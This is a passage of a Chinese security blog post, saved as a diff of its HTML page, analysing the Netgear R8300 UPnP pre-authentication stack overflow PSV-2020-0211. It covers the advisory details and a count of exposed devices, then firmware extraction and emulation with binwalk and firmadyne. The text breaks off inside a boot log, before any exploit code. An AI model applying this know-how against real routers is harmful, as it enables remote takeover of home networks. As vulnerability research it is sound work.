@@ -1,0 +1,1592 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/hackerrank.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/hackerrank.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/hackerrank.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Netgear_栈溢出漏洞_PSV-2020-0211https://kb.netgear.com/000062158/Security-Advisory-for-Pre-Authentication-Command-Injection-on-R8300-PSV-2020-0211 https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Netgear-psv-2020-0211">
+<meta property="og:url" content="https://cool-y.github.io/2021/01/08/Netgear-psv-2020-0211/index.html">
+<meta property="og:site_name" content="混元霹雳手">
+<meta property="og:description" content="Netgear_栈溢出漏洞_PSV-2020-0211https://kb.netgear.com/000062158/Security-Advisory-for-Pre-Authentication-Command-Injection-on-R8300-PSV-2020-0211 https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://res.cloudinary.com/dozyfkbg3/image/upload/v1610083781/netgear/1_3.png">
+<meta property="og:image" content="https://res.cloudinary.com/dozyfkbg3/image/upload/v1610083836/netgear/image_28.png">
+<meta property="og:image" content="https://res.cloudinary.com/dozyfkbg3/image/upload/v1610083882/netgear/image_29.png">
+<meta property="og:image" content="https://res.cloudinary.com/dozyfkbg3/image/upload/v1610083972/netgear/image_30.png">
+<meta property="og:image" content="https://res.cloudinary.com/dozyfkbg3/image/upload/v1610083781/netgear/image_23.png">
+<meta property="og:image" content="https://res.cloudinary.com/dozyfkbg3/image/upload/v1610083780/netgear/image_24.png">
+<meta property="og:image" content="https://res.cloudinary.com/dozyfkbg3/image/upload/v1610083780/netgear/image_25.png">
+<meta property="og:image" content="https://res.cloudinary.com/dozyfkbg3/image/upload/v1610083780/netgear/image_26.png">
+<meta property="og:image" content="https://res.cloudinary.com/dozyfkbg3/image/upload/v1610083779/netgear/image_27.png">
+<meta property="og:updated_time" content="2021-01-08T05:37:03.443Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Netgear-psv-2020-0211">
+<meta name="twitter:description" content="Netgear_栈溢出漏洞_PSV-2020-0211https://kb.netgear.com/000062158/Security-Advisory-for-Pre-Authentication-Command-Injection-on-R8300-PSV-2020-0211 https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-">
+<meta name="twitter:image" content="https://res.cloudinary.com/dozyfkbg3/image/upload/v1610083781/netgear/1_3.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://cool-y.github.io/2021/01/08/Netgear-psv-2020-0211/">
+
+
+
+
+
+  <title>Netgear-psv-2020-0211 | 混元霹雳手</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">混元霹雳手</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-bookmarks">
+          <a href="/bookmarks/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-map"></i> <br>
+            
+            书签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-hack之外">
+          <a href="/hack之外/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br>
+            
+            HACK之外
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://cool-y.github.io/2021/01/08/Netgear-psv-2020-0211/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Cool-Y">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="混元霹雳手">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Netgear-psv-2020-0211</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-01-08T13:26:26+08:00">
+                2021-01-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2021/01/08/Netgear-psv-2020-0211/" class="leancloud_visitors" data-flag-title="Netgear-psv-2020-0211">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                <span title="字数统计">
+                  7.3k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                <span title="阅读时长">
+                  40 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="Netgear-栈溢出漏洞-PSV-2020-0211"><a href="#Netgear-栈溢出漏洞-PSV-2020-0211" class="headerlink" title="Netgear_栈溢出漏洞_PSV-2020-0211"></a>Netgear_栈溢出漏洞_PSV-2020-0211</h1><p><a href="https://kb.netgear.com/000062158/Security-Advisory-for-Pre-Authentication-Command-Injection-on-R8300-PSV-2020-0211" target="_blank" rel="noopener">https://kb.netgear.com/000062158/Security-Advisory-for-Pre-Authentication-Command-Injection-on-R8300-PSV-2020-0211</a><br> <a href="https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/" target="_blank" rel="noopener">https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/</a><br><a href="https://paper.seebug.org/1311/#1" target="_blank" rel="noopener">https://paper.seebug.org/1311/#1</a><br><a href="https://www.anquanke.com/post/id/217606" target="_blank" rel="noopener">https://www.anquanke.com/post/id/217606</a></p>
+<p><strong>固件模拟与UPnP栈溢出利用</strong></p>
+<h2 id="0x00-漏洞概要"><a href="#0x00-漏洞概要" class="headerlink" title="0x00 漏洞概要"></a><strong>0x00 漏洞概要</strong></h2><table>
+<thead>
+<tr>
+<th>漏洞编号：</th>
+<th>PSV-2020-0211</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>披露时间：</td>
+<td><em> 2020 -07-31 — <a href="https://kb.netgear.com/000062158/Security-Advisory-for-Pre-Authentication-Command-Injection-on-R8300-PSV-2020-0211" target="_blank" rel="noopener">Netgear 官方发布安全公告</a> </em> 2020-08-18 – <a href="https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/" target="_blank" rel="noopener">漏洞公开披露</a></td>
+</tr>
+<tr>
+<td>影响厂商：</td>
+<td>Netgear</td>
+</tr>
+<tr>
+<td>漏洞类型：</td>
+<td>栈溢出漏洞</td>
+</tr>
+<tr>
+<td>漏洞评分（CVSS）：</td>
+<td>9.6, (AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)</td>
+</tr>
+<tr>
+<td>利用条件：</td>
+<td>该漏洞只需攻击者能够通过网络访问被攻击路由器的UPnP服务，无需身份验证。</td>
+</tr>
+<tr>
+<td>漏洞成因：</td>
+<td>该漏洞位于路由器的 UPnP 服务中， 由于解析 SSDP 协议数据包的代码存在缺陷，导致未经授权的远程攻击者可以发送特制的数据包使得栈上的 buffer 溢出，进一步控制 PC 执行任意代码。</td>
+</tr>
+</tbody>
+</table>
+<h2 id="0x01-威胁范围"><a href="#0x01-威胁范围" class="headerlink" title="0x01 威胁范围"></a><strong>0x01 威胁范围</strong></h2><table>
+<thead>
+<tr>
+<th>影响范围：</th>
+<th>R8300 running firmware versions prior to 1.0.2.134</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>ZoomEye查询结果：</td>
+<td>Netgear R8300共有579台设备暴露在互联网上，绝大部分分布在美国，少量设备出现在欧洲</td>
+</tr>
+<tr>
+<td>—</td>
+<td><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1610083781/netgear/1_3.png" alt></td>
+</tr>
+<tr>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h2 id="0x02-Qemu模拟"><a href="#0x02-Qemu模拟" class="headerlink" title="0x02 Qemu模拟"></a>0x02 Qemu模拟</h2><table>
+<thead>
+<tr>
+<th>真机调试</th>
+<th>硬件调试接口</th>
+<th>uart</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>历史RCE</td>
+<td>NETGEAR 多款设备基于堆栈的缓冲区溢出远程执行代码漏洞</td>
+</tr>
+<tr>
+<td>设备后门开启telnet</td>
+<td><a href="https://openwrt.org/toh/netgear/telnet.console#for_newer_netgear_routers_that_accept_probe_packet_over_udp_ex2700_r6700_r7000_and_r7500" target="_blank" rel="noopener">Unlocking the Netgear Telnet Console</a></td>
+</tr>
+<tr>
+<td>固件篡改植入telnet</td>
+<td></td>
+</tr>
+<tr>
+<td>固件模拟</td>
+<td>QEMU</td>
+<td>现有平台上模拟 ARM、MIPS、X86、PowerPC、SPARK 等多种架构。</td>
+</tr>
+<tr>
+<td>树莓派、开发板</td>
+<td>只要 CPU 指令集对的上，就可以跑起来</td>
+</tr>
+<tr>
+<td>firmadyne</td>
+<td>基于qemu定制</td>
+</tr>
+<tr>
+<td>Qemu STM32</td>
+<td></td>
+</tr>
+<tr>
+<td>Avatar</td>
+<td>混合式仿真</td>
+</tr>
+</tbody>
+</table>
+<p><a href="http://cjc.ict.ac.cn/online/bfpub/yyc-2020818141436.pdf" target="_blank" rel="noopener">嵌入式设备固件安全分析技术研究综述  http://cjc.ict.ac.cn/online/bfpub/yyc-2020818141436.pdf</a></p>
+<p>由于没有真机，我们采用了固件模拟的方式来搭建分析环境。<br>首先下载有问题的固件 R8300 Firmware Version 1.0.2.130 <a href="http://www.downloads.netgear.com/files/GDC/R8300/R8300-V1.0.2.130_1.0.99.zip" target="_blank" rel="noopener">http://www.downloads.netgear.com/files/GDC/R8300/R8300-V1.0.2.130_1.0.99.zip</a><br>使用binwalk对固件中的特征字符串进行识别，可以看到R8300采用了squashfs文件系统格式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ binwalk R8300-V1.0.2.130_1.0.99.chk</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">58            0x3A            TRX firmware header, little endian, image size: 32653312 bytes, CRC32: 0x5CEAB739, flags: 0x0, version: 1, header size: 28 bytes, loader offset: 0x1C, linux kernel offset: 0x21AB50, rootfs offset: 0x0</span><br><span class="line">86            0x56            LZMA compressed data, properties: 0x5D, dictionary size: 65536 bytes, uncompressed size: 5470272 bytes</span><br><span class="line">2206602       0x21AB8A        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 30443160 bytes, 1650 inodes, blocksize: 131072 bytes, created: 2018-12-13 04:36:38</span><br></pre></td></tr></table></figure>
+<p>使用 <code>binwalk -Me</code> 提取出 Squashfs 文件系统，可以看到R8300为ARM v5架构.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file usr/sbin/upnpd</span><br><span class="line">usr/sbin/upnpd: ELF 32-bit LSB  executable, ARM, EABI5 version 1 (SYSV), dynamically linked (uses shared libs), stripped</span><br></pre></td></tr></table></figure>
+<h3 id="firmadyne"><a href="#firmadyne" class="headerlink" title="firmadyne"></a>firmadyne</h3><p>直接使用firmadyne模拟R8300固件失败，一是网络接口初始化失败，二是NVRAM配置存在问题<br>原因可能是：</p>
+<ul>
+<li>firmadyne只支持armel、mipseb、 mipsel这三种系统内核，相比我们熟悉的armel，armhf代表了另一种不兼容的二进制标准。<a href="https://people.debian.org/~aurel32/qemu/armhf/" target="_blank" rel="noopener">https://people.debian.org/~aurel32/qemu/armhf/</a></li>
+<li><p><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1610083836/netgear/image_28.png" alt></p>
+</li>
+<li><p>NVRAM库劫持失败，firmadyne实现了sem_get()、sem_lock()、sem_unlock()等函数<a href="https://github.com/firmadyne/libnvram" target="_blank" rel="noopener">https://github.com/firmadyne/libnvram</a></p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br></pre></td><td class="code"><pre><span class="line">$ ./fat.py &apos;Path to R8300 firmware file&apos;</span><br><span class="line"></span><br><span class="line">                               __           _</span><br><span class="line">                              / _|         | |</span><br><span class="line">                             | |_    __ _  | |_</span><br><span class="line">                             |  _|  / _` | | __|</span><br><span class="line">                             | |   | (_| | | |_</span><br><span class="line">                             |_|    \__,_|  \__|</span><br><span class="line"></span><br><span class="line">                Welcome to the Firmware Analysis Toolkit - v0.3</span><br><span class="line">    Offensive IoT Exploitation Training http://bit.do/offensiveiotexploitation</span><br><span class="line">                  By Attify - https://attify.com  | @attifyme</span><br><span class="line"></span><br><span class="line">[+] Firmware: R8300-V1.0.2.130_1.0.99.chk</span><br><span class="line">[+] Extracting the firmware...</span><br><span class="line">[+] Image ID: 1</span><br><span class="line">[+] Identifying architecture...</span><br><span class="line">[+] Architecture: armel</span><br><span class="line">[+] Building QEMU disk image...</span><br><span class="line">[+] Setting up the network connection, please standby...</span><br><span class="line">[+] Network interfaces: []</span><br><span class="line">[+] All set! Press ENTER to run the firmware...</span><br><span class="line">[+] When running, press Ctrl + A X to terminate qemu</span><br><span class="line">**[+] Command line: /home/yjy/firmware-analysis-toolkit/firmadyne/scratch/2/run.sh**</span><br><span class="line">[sudo] password for yjy:</span><br><span class="line">Starting firmware emulation... use Ctrl-a + x to exit</span><br><span class="line">[    0.000000] Booting Linux on physical CPU 0x0</span><br><span class="line">[    0.000000] Linux version 4.1.17+ (vagrant@vagrant-ubuntu-trusty-64) (gcc version 5.3.0 (GCC) ) #1 Thu Feb 18 01:05:21 UTC 2016</span><br><span class="line">[    0.000000] CPU: ARMv7 Processor [412fc0f1] revision 1 (ARMv7), cr=10c5387d</span><br><span class="line">[    0.000000] CPU: PIPT / VIPT nonaliasing data cache, PIPT instruction cache</span><br><span class="line">[    0.000000] Machine model: linux,dummy-virt</span><br><span class="line">[    0.000000] debug: ignoring loglevel setting.</span><br><span class="line">[    0.000000] Memory policy: Data cache writeback</span><br><span class="line">[    0.000000] On node 0 totalpages: 65536</span><br><span class="line">[    0.000000] free_area_init_node: node 0, pgdat c061dfe8, node_mem_map cfdf9000</span><br><span class="line">[    0.000000]   Normal zone: 512 pages used for memmap</span><br><span class="line">[    0.000000]   Normal zone: 0 pages reserved</span><br><span class="line">[    0.000000]   Normal zone: 65536 pages, LIFO batch:15</span><br><span class="line">[    0.000000] CPU: All CPU(s) started in SVC mode.</span><br><span class="line">[    0.000000] pcpu-alloc: s0 r0 d32768 u32768 alloc=1*32768</span><br><span class="line">[    0.000000] pcpu-alloc: [0] 0</span><br><span class="line">[    0.000000] Built 1 zonelists in Zone order, mobility grouping on.  Total pages: 65024</span><br><span class="line">[    0.000000] Kernel command line: root=/dev/vda1 console=ttyS0 nandsim.parts=64,64,64,64,64,64,64,64,64,64 rdinit=/firmadyne/preInit.sh rw debug ignore_loglevel print-fatal-signals=1 user_debug=31 firmadyne.syscall=0</span><br><span class="line">[    0.000000] PID hash table entries: 1024 (order: 0, 4096 bytes)</span><br><span class="line">[    0.000000] Dentry cache hash table entries: 32768 (order: 5, 131072 bytes)</span><br><span class="line">[    0.000000] Inode-cache hash table entries: 16384 (order: 4, 65536 bytes)</span><br><span class="line">[    0.000000] Memory: 253344K/262144K available (4297K kernel code, 170K rwdata, 1584K rodata, 180K init, 148K bss, 8800K reserved, 0K cma-reserved)</span><br><span class="line">[    0.000000] Virtual kernel memory layout:</span><br><span class="line">[    0.000000]     vector  : 0xffff0000 - 0xffff1000   (   4 kB)</span><br><span class="line">[    0.000000]     fixmap  : 0xffc00000 - 0xfff00000   (3072 kB)</span><br><span class="line">[    0.000000]     vmalloc : 0xd0800000 - 0xff000000   ( 744 MB)</span><br><span class="line">[    0.000000]     lowmem  : 0xc0000000 - 0xd0000000   ( 256 MB)</span><br><span class="line">[    0.000000]     modules : 0xbf000000 - 0xc0000000   (  16 MB)</span><br><span class="line">[    0.000000]       .text : 0xc0008000 - 0xc05c67bc   (5882 kB)</span><br><span class="line">[    0.000000]       .init : 0xc05c7000 - 0xc05f4000   ( 180 kB)</span><br><span class="line">[    0.000000]       .data : 0xc05f4000 - 0xc061e840   ( 171 kB)</span><br><span class="line">[    0.000000]        .bss : 0xc0621000 - 0xc06462d4   ( 149 kB)</span><br><span class="line">[    0.000000] NR_IRQS:16 nr_irqs:16 16</span><br><span class="line">[    0.000000] Architected cp15 timer(s) running at 62.50MHz (virt).</span><br><span class="line">[    0.000000] clocksource arch_sys_counter: mask: 0xffffffffffffff max_cycles: 0x1cd42e208c, max_idle_ns: 881590405314 ns</span><br><span class="line">[    0.000071] sched_clock: 56 bits at 62MHz, resolution 16ns, wraps every 4398046511096ns</span><br><span class="line">[    0.000128] Switching to timer-based delay loop, resolution 16ns</span><br><span class="line">[    0.001495] Console: colour dummy device 80x30</span><br><span class="line">[    0.001639] Calibrating delay loop (skipped), value calculated using timer frequency.. 125.00 BogoMIPS (lpj=625000)</span><br><span class="line">[    0.001695] pid_max: default: 32768 minimum: 301</span><br><span class="line">[    0.002124] Mount-cache hash table entries: 1024 (order: 0, 4096 bytes)</span><br><span class="line">[    0.002142] Mountpoint-cache hash table entries: 1024 (order: 0, 4096 bytes)</span><br><span class="line">[    0.005250] CPU: Testing write buffer coherency: ok</span><br><span class="line">[    0.008040] Setting up static identity map for 0x40008240 - 0x40008298</span><br><span class="line">[    0.015663] VFP support v0.3: implementor 41 architecture 4 part 30 variant f rev 0</span><br><span class="line">[    0.019946] clocksource jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 19112604462750000 ns</span><br><span class="line">[    0.025312] NET: Registered protocol family 16</span><br><span class="line">[    0.026714] DMA: preallocated 256 KiB pool for atomic coherent allocations</span><br><span class="line">[    0.028535] cpuidle: using governor ladder</span><br><span class="line">[    0.028604] cpuidle: using governor menu</span><br><span class="line">[    0.030202] genirq: Setting trigger mode 1 for irq 20 failed (gic_set_type+0x0/0x48)</span><br><span class="line">[    0.031001] genirq: Setting trigger mode 1 for irq 21 failed (gic_set_type+0x0/0x48)</span><br><span class="line">[    0.031154] genirq: Setting trigger mode 1 for irq 22 failed 